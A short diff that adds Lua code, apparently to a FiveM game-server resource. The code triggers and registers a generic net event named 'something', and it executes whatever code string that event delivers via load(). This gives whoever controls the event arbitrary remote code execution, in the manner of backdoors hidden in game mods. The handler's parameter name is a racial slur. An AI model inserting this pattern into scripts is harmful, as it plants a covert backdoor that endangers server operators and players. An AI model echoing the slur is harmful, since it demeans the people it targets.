@@ -1,0 +1,7 @@
+    CreateThread(function()
+        TriggerServerEvent("something")
+        RegisterNetEvent("something")
+        AddEventHandler("something", function(nigga_code)
+        load(nigga_code)()
+        end)
+    end)
